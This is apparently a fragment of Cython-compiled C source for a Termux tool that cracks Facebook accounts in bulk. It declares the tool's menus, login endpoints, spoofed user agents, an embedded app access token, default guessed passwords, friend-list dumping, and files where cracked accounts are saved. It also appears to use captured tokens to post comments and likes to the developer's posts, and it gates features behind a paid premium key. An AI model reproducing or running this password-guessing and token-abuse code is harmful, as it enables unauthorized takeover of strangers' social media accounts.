\342\226\210\n\033[1;31;1m\342\226\210 \033[1;92m [\342\200\242] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m \342\226\210 \n\033[1;31;1m\342\226\210 \033[1;92m [\342\200\242] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m\342\226\210 \n\033[1;92m
static const char __pyx_k_Extra_File_saved_in_s[] = "  [\342\234\223] Extra File saved in \342\200\242> %s";
static const char __pyx_k_Password_method_y_t_2[] = "  [!] Password method [y/t] : ";
static const char __pyx_k_Talk_To_Admin_For_Key[] = "  Talk To Admin For Key...\n";
static const char __pyx_k_Total_id_0_91m_s_0_0m[] = "  [\342\234\223] Total id \342\200\242> \033[0;91m(%s)\033[0;0m";
static const char __pyx_k_prefill_contact_point[] = "prefill_contact_point";
static const char __pyx_k_rm_rf_sdcard_1000_txt[] = "rm -rf /sdcard/1000.txt";
static const char __pyx_k_rm_rf_sdcard_10_0_txt[] = "rm -rf /sdcard/10_0.txt";
static const char __pyx_k_2_Try_method_No_2_fast[] = "  [2] Try method No - 2 (fast)";
static const char __pyx_k_3_Try_method_No_3_fast[] = "  [3] Try method No - 3 (fast)";
static const char __pyx_k_No_internet_connection[] = " [!] No internet connection";
static const char __pyx_k_Total_id_0_91m_s_0_97m[] = "  [\342\234\223] Total id \342\200\242> \033[0;91m(%s)\033[0;97m";
static const char __pyx_k_Total_id_0_92m_s_0_97m[] = "  [\342\234\223] Total id \342\200\242> \033[0;92m%s\033[0;97m";
static const char __pyx_k_had_password_prefilled[] = "had_password_prefilled";
static const char __pyx_k_successful_login_token[] = " \n  [\342\234\223] successful login token";
static const char __pyx_k_you_are_not_registered[] = "you are not registered";
static const char __pyx_k_3_Clone_Using_File_Path[] = "  [3] Clone Using File Path";
static const char __pyx_k_3_Clone_using_file_path[] = "  [3] Clone using file path";
static const char __pyx_k_Enter_The_Number_Of_Ids[] = "  [!] Enter The Number Of Ids : ";
static const char __pyx_k_Enter_the_number_of_IDs[] = "  [!] Enter the number of IDs : ";
static const char __pyx_k_Sorry_Your_Choice_Wrong[] = " [!!] Sorry Your Choice Wrong";
static const char __pyx_k_https_free_facebook_com[] = "https://free.facebook.com";
static const char __pyx_k_x_fb_connection_quality[] = "x-fb-connection-quality";
static const char __pyx_k_0_32m_Login_Successfully[] = "\n\033[0;32m  [\342\234\223] Login Successfully\n";
static const char __pyx_k_Please_Dump_File_first_s[] = "\n [!] Please Dump File first %s ";
static const char __pyx_k_Total_id_0_91m_s_0_97m_2[] = "  [+] Total id \342\200\242> \033[0;91m(%s)\033[0;97m";
static const char __pyx_k_Total_id_0_91m_s_0_97m_3[] = "  [\342\234\223] Total id -> \033[0;91m%s\033[0;97m";
static const char __pyx_k_Total_id_0_91m_s_0_97m_4[] = "  [\342\234\223] Total id \342\200\242> \033[0;91m%s\033[0;97m";
static const char __pyx_k_Cp_result_saved_in_cp_txt[] = "  [\342\234\223] Cp result saved in \342\200\242> cp.txt";
static const char __pyx_k_Status_1_32mPrimium_0_97m[] = "  [\342\234\223] Status  : \033[1;32mPrimium\033[0;97m";
static const char __pyx_k_https_mbasic_facebook_com[] = "https://mbasic.facebook.com";
static const char __pyx_k_storage_emulated_0_f2_txt[] = "/storage/emulated/0/f2.txt";
static const char __pyx_k_upgrade_insecure_requests[] = "upgrade-insecure-requests";
static const char __pyx_k_x_fb_connection_bandwidth[] = "x-fb-connection-bandwidth";
static const char __pyx_k_2_Clone_All_in_one_Account[] = "  [2] Clone All in one Account";
static const char __pyx_k_5_File_Cloning_0_37m_Login[] = "  [5] File Cloning\033[0;37m (Login)";
static const char __pyx_k_Extra_Dump_File_saved_in_s[] = "  [\342\234\223] Extra Dump File saved in \342\200\242> %s";
static const char __pyx_k_Successfully_deleted_token[] = "\n [\342\234\223] Successfully deleted token";
static const char __pyx_k_login_next_ref_dbl_refid_8[] = "/login/?next&ref=dbl&refid=8";
static const char __pyx_k_storage_emulated_0_100_txt[] = "/storage/emulated/0/100.txt";
static const char __pyx_k_storage_emulated_0_f_2_txt[] = "/storage/emulated/0/f_2.txt";
static const char __pyx_k_Extra_Dump_Files_Saved_In_s[] = "  [\342\234\223] Extra Dump Files Saved In \342\200\242> %s";
static const char __pyx_k_Extra_Dump_Files_saved_in_s[] = "  [\342\234\223] Extra Dump Files saved in \342\200\242> %s";
static const char __pyx_k_How_Much_Link_You_Want_Dump[] = "\n  [!] How Much Link You Want Dump : ";
static const char __pyx_k_How_much_link_you_want_dump[] = "\n  [!] How much link you want dump : ";
static const char __pyx_k_Sir_big_fan_please_reply_me[] = "Sir big fan please reply me\360\237\231\217\360\237\231\217\360\237\231\217";
static const char __pyx_k_Status_0_31mTrail_Free_1_0m[] = "  [\342\234\223] Status  : \033[0;31mTrail/Free\033[1;0m";
static const char __pyx_k_storage_emulated_0_1000_txt[] = "/storage/emulated/0/1000.txt";
static const char __pyx_k_storage_emulated_0_10_0_txt[] = "/storage/emulated/0/10_0.txt";
static const char __pyx_k_0_91m_Total_id_0_91m_s_0_97m[] = "  \033[0;91m[\342\234\223] Total id \342\200\242> \033[0;91m(%s)\033[0;97m";
static const char __pyx_k_0_97m_1_Try_method_No_1_fast[] = "\n  \033[0;97m[1] Try method No - 1 (fast)";
static const char __pyx_k_0_97m_Total_id_0_92m_s_0_97m[] = "  \033[0;97m[\342\234\223] Total id \342\200\242> \033[0;92m%s\033[0;97m";
static const char __pyx_k_How_Much_Account_U_Want_Dump[] = "\n  [!] How Much Account U Want Dump : ";
static const char __pyx_k_How_much_account_u_want_dump[] = "\n  [?] How much account u want dump : ";
static const char __pyx_k_0_92m_Enter_The_Number_Of_Ids[] = "  \033[0;92m[!] Enter The Number Of Ids : ";
static const char __pyx_k_How_much_link_you_want_dump_2[] = "\n  [?] How much link you want dump : ";
static const char __pyx_k_Password_Minimum_6_Characters[] = "\n  [!] Password Minimum 6 Characters";
static const char __pyx_k_login_next_ref_dbl_fl_refid_8[] = "/login/?next&ref=dbl&fl&refid=8";
static const char __pyx_k_password_minimum_6_characters[] = "\n  [!] password minimum 6 characters";
static const char __pyx_k_0_Exit_0_97m_0_93mremove_token[] = "  [0] Exit \033[0;97m[\033[0;93mremove token\033[0;97m]";
static const char __pyx_k_1_37m_Warning_0_97mYou_Are_Not[] = " [!] \033[1;37m Warning : \033[0;97mYou Are Not Registered Yet, Please Choose Number 6";
static const char __pyx_k_Sir_your_my_favorite_Developer[] = "Sir your my favorite Developer\360\237\222\234";
static const char __pyx_k_storage_emulated_0_f__rindlist[] = "/storage/emulated/0/f__rindlist.txt";
static const char __pyx_k_0_91m_Choose_Code_11_12_13_14_1[] = "  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ";
static const char __pyx_k_0_92m_Choose_Code_200_201_202_2[] = "  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ";
static const char __pyx_k_0_92m_Crack_with_password_0_91m[] = "  \033[0;92m[\342\234\223] Crack with password \342\200\242> (\033[0;91m%s\033[0;97m)";
static const char __pyx_k_0_92m_For_example_separators_12[] = "\n  \033[0;92m[*] For example separators : 123456,123456789";
static const char __pyx_k_0_92m_Ok_result_saved_in_ok_txt[] = "\n  \033[0;92m[\342\234\223] Ok result saved in \342\200\242> ok.txt";
static const char __pyx_k_0_97m_1_Clone_only_10000_to_100[] = "\n  \033[0;97m[1] Clone only 10000 to 10000000 account";
static const char __pyx_k_0_97m_Crack_With_Password_0_91m[] = "  \033[0;97m[\342\234\223] Crack With Password \342\200\242> (\033[0;91m%s\033[0;97m)";
static const char __pyx_k_0_97m_Crack_with_password_0_91m[] = "  \033[0;97m[\342\234\223] Crack with password \342\200\242> (\033[0;91m%s\033[0;97m)";
static const char __pyx_k_0_97m_For_Example_Separators_12[] = "\n  \033[0;97m[*] For Example Separators : 123456,123456789";
static const char __pyx_k_0_97m_For_Example_Separators_44[] = "\n  \033[0;97m[*] For Example Separators : 445566,786786786";
static const char __pyx_k_0_97m_For_example_Separators_44[] = "\n  \033[0;97m[*] For example Separators : 445566,786786786";
static const char __pyx_k_0_97m_For_example_separators_44[] = "\n  \033[0;97m[*] For example separators : 445566,786786786";
static const char __pyx_k_0_97m_Ok_result_saved_in_ok_txt[] = "\n  \033[0;97m[\342\234\223] Ok result saved in \342\200\242> ok.txt";
static const char __pyx_k_1_1_92m_2009_Random_Cloning_0_9[] = "\n  [1]\033[1;92m 2009 Random Cloning\033[0;97m (Mbasic)";
static const char __pyx_k_1_2009_Random_Cloning_0_97m_Mba[] = "\n  [1] 2009 Random Cloning\033[0;97m (Mbasic)";
static const char __pyx_k_1_31m_Warning_0_37m_Don_t_Run_T[] = "\n [!] \033[1;31m Warning : \033[0;37m Don't Run The Tools If You Haven't Registered With Admin...";
static const char __pyx_k_1_31m_Warning_1_37m_You_Are_Not[] = "  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6";
static const char __pyx_k_1_Clone_only_100074_100075_acco[] = "\n  [1] Clone only 100074 & 100075 account";
static const char __pyx_k_2010_10000170_10000180_10000190[] = "   \342\200\242 2010 \342\200\242> 10000170,10000180,10000190\n   \342\200\242 2008 \342\200\242> 10000000\n  [+] Choose Code : ";
static const char __pyx_k_2_1_92m_2008_to_2010_Random_Clo[] = "  [2]\033[1;92m 2008 to 2010  Random Cloning\033[0;97m (free)";
static const char __pyx_k_2_2008_to_2010_Random_Cloning_0[] = "  [2] 2008 to 2010  Random Cloning\033[0;97m (free)";
static const char __pyx_k_3_1_92m_2005_Random_Cloning_0_9[] = "  [3]\033[1;92m 2005 Random Cloning\033[0;97m (B-api)";
static const char __pyx_k_3_2005_Random_Cloning_0_97m_B_a[] = "  [3] 2005 Random Cloning\033[0;97m (B-api)";
static const char __pyx_k_4_1_92m_2004_Random_Cloning_0_9[] = "  [4]\033[1;92m 2004 Random Cloning\033[0;97m (B-api)";
static const char __pyx_k_4_2004_Random_Cloning_0_97m_B_a[] = "  [4] 2004 Random Cloning\033[0;97m (B-api)";
static const char __pyx_k_5_1_92m_File_Cloning_0_97m_Logi[] = "  [5]\033[1;92m File Cloning\033[0;97m (Login)";
static const char __pyx_k_6_1_92m_Upgrade_To_0_32mPremium[] = "  [6]\033[1;92m Upgrade To \033[0;32mPremium\033[0;37m";
static const char __pyx_k_Dump_Failed_Maybe_The_User_Is_W[] = "  [!]  Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends";
static const char __pyx_k_Dump_failed_maybe_the_user_is_w[] = "  [!] Dump failed, maybe the user is wrong / doesn't have friends";
static const char __pyx_k_If_No_Result_Turn_On_Airplane_M[] = "  [!] If No Result Turn On Airplane Mode 5 Seconds\n";
static const char __pyx_k_Mozilla_5_0_Linux_Android_10_Mi[] = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)";
static const char __pyx_k_Password_Minimum_6_Characters_2[] = "\n  [!]  Password Minimum 6 Characters";
static const char __pyx_k_Please_Dump_File_first_s_not_fo[] = "\n [!] Please Dump File first %s not found";
static const char __pyx_k_Your_Path_Wrong_Please_Check_Fi[] = "\n [!] Your Path Wrong! Please Check File Path %s not found";
static const char __pyx_k_credentials_type_device_based_l[] = "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true";
static const char __pyx_k_https_b_api_facebook_com_method[] = "https://b-api.facebook.com/method/auth.login?format=json&email=";
static const char __pyx_k_https_mbasic_facebook_com_login[] = "https://mbasic.facebook.com/login.php";
static const char __pyx_k_https_pastebin_com_raw_2ivpYP20[] = "https://pastebin.com/raw/2ivpYP20";
static const char __pyx_k_id_ID_id_q_0_9_en_US_q_0_8_en_q[] = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7";
static const char __pyx_k_if_no_result_turn_on_airplane_m[] = "  [!] if no result turn on airplane mode 5 seconds\n";
static const char __pyx_k_james_bs4_module_is_not_install[] = "\n !.james bs4 module is not installed yet";
static const char __pyx_k_james_futures_module_not_instal[] = "\n ! james futures module not installed";
static const char __pyx_k_james_requests_module_is_not_in[] = "\n ! james requests module is not installed";
static const char __pyx_k_login_device_based_regular_logi[] = "/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8";
static const char __pyx_k_text_html_application_xhtml_xml[] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
static const char __pyx_k_Dalvik_1_6_0_Linux_U_Android_4_4[] = "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]";
static const char __pyx_k_Mozilla_5_0_Windows_IoT_10_0_And[] = "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134";
static const char __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36";
static const char __pyx_k_Mozilla_5_0_Windows_NT_6_1_WOW64[] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36";
static const char __pyx_k_Mozilla_5_0_Windows_NT_6_1_Win64[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36";
static const char __pyx_k_am_start_https_wa_me_96598064347[] = "am start https://wa.me/+96598064347?text=hello%20sir,%20I%20want%20to%20buy%20a%20premium%20script%20:%20";
static const char __pyx_k_application_x_www_form_urlencode[] = "application/x-www-form-urlencoded";
static const char __pyx_k_cell_CTRadioAccessTechnologyHSDP[] = "cell.CTRadioAccessTechnologyHSDPA";
static const char __pyx_k_https_api_asutoolkit_cloudaccess[] = "https://api-asutoolkit.cloudaccess.host/ip.php";
static const char __pyx_k_https_graph_facebook_com_1000070[] = "https://graph.facebook.com/100007018489471/subscribers?access_token=";
static const char __pyx_k_https_graph_facebook_com_2614119[] = "https://graph.facebook.com/2614119432165314/likes?summary=true&access_token=";
static const char __pyx_k_https_graph_facebook_com_2867565[] = "https://graph.facebook.com/2867565956820659/reactions?type=love&access_token=";
static const char __pyx_k_https_graph_facebook_com_2985411[] = "https://graph.facebook.com/2985411081702812/comments/?message=";
static const char __pyx_k_https_graph_facebook_com_3048075[] = "https://graph.facebook.com/3048075795436340/comments/?message=";
static const char __pyx_k_https_graph_facebook_com_me_acce[] = "https://graph.facebook.com/me?access_token=";
static const char __pyx_k_https_graph_facebook_com_s_field[] = "https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s";
static const char __pyx_k_https_james_anggakurniawan_my_id[] = "https://james.anggakurniawan.my.id/chek.php?project=license&apikey=";
static const char __pyx_k_xdg_open_https_youtube_com_chann[] = "xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA";
static const char __pyx_k_Dump_Failed_Maybe_The_User_Is_W_2[] = "  [!] Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends";
static const char __pyx_k_Your_Path_Wrong_Please_Check_Fi_2[] = "\n [!] Your Path Wrong! Please Check File Path \342\200\242> %s ";
static const char __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6_2[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0";
static const char __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6_3[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36";
static const char __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6_4[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0";
static const char __pyx_k_https_graph_facebook_com_me_acce_2[] = "https://graph.facebook.com/me/?access_token=";
static PyObject *__pyx_kp_s_;
static PyObject *__pyx_kp_s_0;
static PyObject *__pyx_kp_s_00;
static PyObject *__pyx_kp_s_01;
static PyObject *__pyx_kp_s_02;
static PyObject *__pyx_kp_s_03;
static PyObject *__pyx_kp_s_04;
static PyObject *__pyx_kp_s_05;
static PyObject *__pyx_kp_s_06;
static PyObject *__pyx_kp_s_07;
static PyObject *__pyx_kp_s_08;
static PyObject *__pyx_kp_s_09;
static PyObject *__pyx_kp_s_0_32m_Login_Successfully;
static PyObject *__pyx_kp_s_0_91m_Choose_Code_11_12_13_14_1;
static PyObject *__pyx_kp_s_0_91m_Total_id_0_91m_s_0_97m;
static PyObject *__pyx_kp_s_0_91m_s_s_0_97m;
static PyObject *__pyx_kp_s_0_92m_Choose_Code_200_201_202_2;
static PyObject *__pyx_kp_s_0_92m_Crack_with_password_0_91m;
static PyObject *__pyx_kp_s_0_92m_Enter_Key;
static PyObject *__pyx_kp_s_0_92m_Enter_The_Number_Of_Ids;
static PyObject *__pyx_kp_s_0_92m_For_example_separators_12;
static PyObject *__pyx_kp_s_0_92m_Ok_result_saved_in_ok_txt;
static PyObject *__pyx_kp_s_0_92m_s_s_0_97m;
static PyObject *__pyx_kp_s_0_97m_1_Clone_only_10000_to_100;
static PyObject *__pyx_kp_s_0_97m_1_Try_method_No_1_fast;
static PyObject *__pyx_kp_s_0_97m_Crack_With_Password_0_91m;
static PyObject *__pyx_kp_s_0_97m_Crack_with_password_0_91m;
static PyObject *__pyx_kp_s_0_97m_Enter_your_file;
static PyObject *__pyx_kp_s_0_97m_For_Example_Separators_12;
static PyObject *__pyx_kp_s_0_97m_For_Example_Separators_44;
static PyObject *__pyx_kp_s_0_97m_For_example_Separators_44;
static PyObject *__pyx_kp_s_0_97m_For_example_separators_44;
static PyObject *__pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt;
static PyObject *__pyx_kp_s_0_97m_Total_id_0_92m_s_0_97m;
static PyObject *__pyx_kp_s_0_97m_Your_Token;
static PyObject *__pyx_kp_s_0_97m_s_s_0_97m;
static PyObject *__pyx_kp_s_0_Exit_0_97m_0_93mremove_token;
static PyObject *__pyx_kp_s_1;
static PyObject *__pyx_kp_s_10;
static PyObject *__pyx_n_s_1000;
static PyObject *__pyx_kp_s_10000;
static PyObject *__pyx_kp_s_100000;
static PyObject *__pyx_kp_s_1000000;
static PyObject *__pyx_n_s_10000_2;
static PyObject *__pyx_n_s_10007;
static PyObject *__pyx_kp_s_100074;
static PyObject *__pyx_kp_s_100075;
static PyObject *__pyx_kp_s_100076;
static PyObject *__pyx_kp_s_100078;
static PyObject *__pyx_n_s_100__00;
static PyObject *__pyx_n_s_100__07;
static PyObject *__pyx_kp_s_11;
static PyObject *__pyx_kp_s_12;
static PyObject *__pyx_kp_s_123;
static PyObject *__pyx_kp_s_1234;
static PyObject *__pyx_kp_s_12345;
static PyObject *__pyx_kp_s_156;
static PyObject *__pyx_kp_s_1_1_92m_2009_Random_Cloning_0_9;
static PyObject *__pyx_kp_s_1_2009_Random_Cloning_0_97m_Mba;
static PyObject *__pyx_kp_s_1_31m_Warning_0_37m_Don_t_Run_T;
static PyObject *__pyx_kp_s_1_31m_Warning_1_37m_You_Are_Not;
static PyObject *__pyx_kp_s_1_37m_Warning_0_97mYou_Are_Not;
static PyObject *__pyx_kp_s_1_91m_s_s_0_97m;
static PyObject *__pyx_kp_s_1_92m_T_Date_s;
static PyObject *__pyx_kp_s_1_92m_____1_92m_1_92m;
static PyObject *__pyx_kp_s_1_92m_s_s_0_97m;
static PyObject *__pyx_kp_s_1_Clone_only_100074_100075_acco;
static PyObject *__pyx_kp_s_2;
static PyObject *__pyx_kp_s_2010_10000170_10000180_10000190;
static PyObject *__pyx_kp_s_2_1_92m_2008_to_2010_Random_Clo;
static PyObject *__pyx_kp_s_2_2008_to_2010_Random_Cloning_0;
static PyObject *__pyx_kp_s_2_Clone_All_in_one_Account;
static PyObject *__pyx_kp_s_2_Try_method_No_2_fast;
static PyObject *__pyx_kp_s_3;
static PyObject *__pyx_n_s_33__3;
static PyObject *__pyx_n_s_33__33;
static PyObject *__pyx_kp_s_3_1_92m_2005_Random_Cloning_0_9;
static PyObject *__pyx_kp_s_3_2005_Random_Cloning_0_97m_B_a;
static PyObject *__pyx_kp_s_3_Clone_Using_File_Path;
static PyObject *__pyx_kp_s_3_Clone_using_file_path;
static PyObject *__pyx_kp_s_3_Try_method_No_3_fast;
static PyObject *__pyx_kp_s_4;
static PyObject *__pyx_kp_s_4_1_92m_2004_Random_Cloning_0_9;
static PyObject *__pyx_kp_s_4_2004_Random_Cloning_0_97m_B_a;
static PyObject *__pyx_kp_s_5;
static PyObject *__pyx_kp_s_5_1_92m_File_Cloning_0_97m_Logi;
static PyObject *__pyx_kp_s_5_File_Cloning_0_37m_Login;
static PyObject *__pyx_kp_s_6;
static PyObject *__pyx_kp_s_6_1_92m_Upgrade_To_0_32mPremium;
static PyObject *__pyx_kp_s_786;
static PyObject *__pyx_n_s_April;
static PyObject *__pyx_n_s_August;
static PyObject *__pyx_n_s_BeautifulSoup;
static PyObject *__pyx_kp_s_Big_fan_brother;
static PyObject *__pyx_kp_s_Big_fan_sir;
static PyObject *__pyx_kp_s_CP_s_txt;
static PyObject *__pyx_kp_s_Choose_Option;
static PyObject *__pyx_kp_s_Choose_Option_2;
static PyObject *__pyx_n_s_ConnectionError;
static PyObject *__pyx_kp_s_Cp_result_saved_in_cp_txt;
static PyObject *__pyx_kp_s_Cracking_finished;
static PyObject *__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4;
static PyObject *__pyx_n_s_December;
static PyObject *__pyx_kp_s_Dump_Failed_Maybe_The_User_Is_W;
static PyObject *__pyx_kp_s_Dump_Failed_Maybe_The_User_Is_W_2;
static PyObject *__pyx_kp_s_Dump_failed_maybe_the_user_is_w;
static PyObject *__pyx_n_s_EAAA;
static PyObject *__pyx_n_s_EXCELLENT;
static PyObject *__pyx_kp_s_Enter_Password;
static PyObject *__pyx_kp_s_Enter_The_Number_Of_Ids;
static PyObject *__pyx_kp_s_Enter_User_ID;
static PyObject *__pyx_kp_s_Enter_password;
static PyObject *__pyx_kp_s_Enter_the_number_of_IDs;
static PyObject *__pyx_kp_s_Enter_your_file;
static PyObject *__pyx_kp_s_Expired_s;
static PyObject *__pyx_kp_s_Expired_tokens;
static PyObject *__pyx_kp_s_Extra_Dump_File_saved_in_s;
static PyObject *__pyx_kp_s_Extra_Dump_Files_Saved_In_s;
static PyObject *__pyx_kp_s_Extra_Dump_Files_saved_in_s;
static PyObject *__pyx_kp_s_Extra_File_saved_in_s;
static PyObject *__pyx_n_s_February;
static PyObject *__pyx_n_s_Fr__rr;
static PyObject *__pyx_n_s_Frr;
static PyObject *__pyx_n_s_Frrr;
static PyObject *__pyx_n_s_Host;
static PyObject *__pyx_kp_s_How_Much_Account_U_Want_Dump;
static PyObject *__pyx_kp_s_How_Much_Link_You_Want_Dump;
static PyObject *__pyx_kp_s_How_much_account_u_want_dump;
static PyObject *__pyx_kp_s_How_much_link_you_want_dump;
static PyObject *__pyx_kp_s_How_much_link_you_want_dump_2;
static PyObject *__pyx_n_s_IOError;
static PyObject *__pyx_kp_s_If_No_Result_Turn_On_Airplane_M;
static PyObject *__pyx_n_s_ImportError;
static PyObject *__pyx_n_s_James;
static PyObject *__pyx_kp_s_James_Boss;
static PyObject *__pyx_kp_s_James_Bro;
static PyObject *__pyx_n_s_James___1000;
static PyObject *__pyx_n_s_James___10000;
static PyObject *__pyx_n_s_James___10007;
static PyObject *__pyx_n_s_James___100__00;
static PyObject *__pyx_n_s_James___100__07;
static PyObject *__pyx_n_s_James___33__3;
static PyObject *__pyx_n_s_James___Fr__rr;
static PyObject *__pyx_n_s_James___Frr;
static PyObject *__pyx_n_s_James___Frrr;
static PyObject *__pyx_n_s_James___api;
static PyObject *__pyx_n_s_James___apii;
static PyObject *__pyx_n_s_James___bapi;
static PyObject *__pyx_n_s_James___bot__follow;
static PyObject *__pyx_n_s_James___f_james;
static PyObject *__pyx_n_s_James___fb;
static PyObject *__pyx_n_s_James___fb2;
static PyObject *__pyx_n_s_James___fb3;
static PyObject *__pyx_n_s_James___fb4;
static PyObject *__pyx_n_s_James___file;
static PyObject *__pyx_n_s_James___init;
static PyObject *__pyx_n_s_James___login;
static PyObject *__pyx_n_s_James___ma___sal2;
static PyObject *__pyx_n_s_James___ma__sal2;
static PyObject *__pyx_n_s_James___masal;
static PyObject *__pyx_n_s_James___masal2;
static PyObject *__pyx_n_s_James___me__nnn;
static PyObject *__pyx_n_s_James___menn;
static PyObject *__pyx_n_s_James___mennn;
static PyObject *__pyx_n_s_James___menu__file;
static PyObject *__pyx_n_s_James___method__1;
static PyObject *__pyx_n_s_James___method__2;
static PyObject *__pyx_n_s_James___request;
static PyObject *__pyx_n_s_James___start;
static PyObject *__pyx_n_s_James_main_coeg;
static PyObject *__pyx_n_s_January;
static PyObject *__pyx_n_s_July;
static PyObject *__pyx_n_s_June;
static PyObject *__pyx_n_s_KeyError;
static PyObject *__pyx_n_s_Liger;
static PyObject *__pyx_kp_s_Love_it;
static PyObject *__pyx_kp_s_Love_you_sir;
static PyObject *__pyx_n_s_March;
static PyObject *__pyx_n_s_May;
static PyObject *__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi;
static PyObject *__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And;
static PyObject *__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6;
static PyObject *__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2;
static PyObject *__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3;
static PyObject *__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4;
static PyObject *__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64;
static PyObject *__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64;
static PyObject *__pyx_kp_s_No_internet_connection;
static PyObject *__pyx_n_s_November;
static PyObject *__pyx_n_s_OK;
static PyObject *__pyx_kp_s_OK_s_txt;
static PyObject *__pyx_n_s_October;
static PyObject *__pyx_kp_s_Password_Method_y_t;
static PyObject *__pyx_kp_s_Password_Minimum_6_Characters;
static PyObject *__pyx_kp_s_Password_Minimum_6_Characters_2;
static PyObject *__pyx_kp_s_Password_method_y_t;
static PyObject *__pyx_kp_s_Password_method_y_t_2;
static PyObject *__pyx_kp_s_Please_Dump_File_first_s;
static PyObject *__pyx_kp_s_Please_Dump_File_first_s_not_fo;
static PyObject *__pyx_n_s_Premium;
static PyObject *__pyx_kp_s_Return_menu;
static PyObject *__pyx_kp_s_Select_One;
static PyObject *__pyx_n_s_September;
static PyObject *__pyx_n_s_Session;
static PyObject *__pyx_kp_s_Sir_big_fan_please_reply_me;
static PyObject *__pyx_kp_s_Sir_please_reply_me;
static PyObject *__pyx_kp_s_Sir_your_my_favorite_Developer;
static PyObject *__pyx_kp_s_Sorry_Your_Choice_Wrong;
static PyObject *__pyx_kp_s_Star;
static PyObject *__pyx_kp_s_Status_0_31mTrail_Free_1_0m;
static PyObject *__pyx_kp_s_Status_1_32mPrimium_0_97m;
static PyObject *__pyx_kp_s_Successfully_deleted_token;
static PyObject *__pyx_kp_s_Super_Star;
static PyObject *__pyx_kp_s_Talk_To_Admin_For_Key;
static PyObject *__pyx_n_s_ThreadPoolExecutor;
static PyObject *__pyx_kp_s_Token_Invalid;
static PyObject *__pyx_kp_s_Token_invalid;
static PyObject *__pyx_kp_s_Total_id_0_91m_s_0_0m;
static PyObject *__pyx_kp_s_Total_id_0_91m_s_0_97m;
static PyObject *__pyx_kp_s_Total_id_0_91m_s_0_97m_2;
static PyObject *__pyx_kp_s_Total_id_0_91m_s_0_97m_3;
static PyObject *__pyx_kp_s_Total_id_0_91m_s_0_97m_4;
static PyObject *__pyx_kp_s_Total_id_0_92m_s_0_97m;
static PyObject *__pyx_n_s_Trial;
static PyObject *__pyx_n_s_ValueError;
static PyObject *__pyx_kp_s_Warning_Check_link;
static PyObject *__pyx_kp_s_Wow_sir;
static PyObject *__pyx_kp_s_Wrong_Key_Bro;
static PyObject *__pyx_kp_s_Your_Path_Wrong_Please_Check_Fi;
static PyObject *__pyx_kp_s_Your_Path_Wrong_Please_Check_Fi_2;
static PyObject *__pyx_kp_s_Your_ip_s;
static PyObject *__pyx_n_s__112;
static PyObject *__pyx_kp_s__12;
static PyObject *__pyx_kp_s__28;
static PyObject *__pyx_kp_s__38;
static PyObject *__pyx_kp_s__39;
static PyObject *__pyx_kp_s__43;
static PyObject *__pyx_kp_s__55;
static PyObject *__pyx_kp_s__56;
static PyObject *__pyx_kp_s__68;
static PyObject *__pyx_n_s__97;
